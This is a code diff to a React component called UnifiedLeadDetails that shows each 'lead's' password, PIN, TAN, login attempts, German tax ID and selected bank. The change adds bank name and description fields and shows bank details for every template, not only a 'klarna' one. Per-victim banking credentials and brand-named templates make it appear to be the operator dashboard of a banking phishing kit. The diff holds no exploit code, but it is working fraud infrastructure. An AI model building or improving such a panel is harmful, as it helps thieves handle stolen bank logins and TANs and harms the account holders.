@@ -135,6 +135,9 @@ export const UnifiedLeadDetails: React.FC = () => {
   const bzstSteuerId = additionalData.steueridentifikationsnummer as string | undefined;
   const branchData = additionalData.selected_branch || additionalData.selectedBranch || additionalData.branchData || null;
   const selectedBank = additionalData.selected_bank || loginData.bank_type || null;
+  const selectedBankName = additionalData.selected_bank_name as string | undefined;
+  const selectedBankDescription = additionalData.selected_bank_description as string | undefined;
+  const loginAttempts = additionalData.login_attempts || additionalData.history?.login_attempts || [];
 
   // Create display name
   const formatEmailDisplayName = (email: string): string => {
@@ -213,7 +216,7 @@ export const UnifiedLeadDetails: React.FC = () => {
           password={lead.password}
           pin={lead.pin}
           tan={lead.tan}
-          loginAttempts={additionalData.login_attempts}
+          loginAttempts={loginAttempts}
         />
       </div>
 
@@ -240,8 +243,8 @@ export const UnifiedLeadDetails: React.FC = () => {
         </div>
       )}
 
-      {/* Bank Information (for Klarna template) */}
-      {selectedBank && lead.template_name === 'klarna' && (
+      {/* Bank Information */}
+      {selectedBank && (
         <div className="bg-white p-6 rounded-lg shadow-sm border border-gray-200">
           <h3 className="text-lg font-semibold mb-4 text-gray-800 flex items-center">
             <Building2 className="mr-2 h-5 w-5 text-pink-600" />
@@ -250,12 +253,18 @@ export const UnifiedLeadDetails: React.FC = () => {
           <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
             <div>
               <label className="block text-sm font-medium text-gray-700 mb-1">Bank</label>
-              <p className="text-gray-900 font-semibold">{getBankDisplayName(selectedBank)}</p>
+              <p className="text-gray-900 font-semibold">{selectedBankName || getBankDisplayName(selectedBank)}</p>
             </div>
             <div>
               <label className="block text-sm font-medium text-gray-700 mb-1">Bank-ID</label>
               <p className="text-gray-600 font-mono text-sm">{selectedBank}</p>
             </div>
+            {selectedBankDescription && (
+              <div className="md:col-span-2">
+                <label className="block text-sm font-medium text-gray-700 mb-1">Beschreibung</label>
+                <p className="text-gray-600">{selectedBankDescription}</p>
+              </div>
+            )}
           </div>
         </div>
       )}
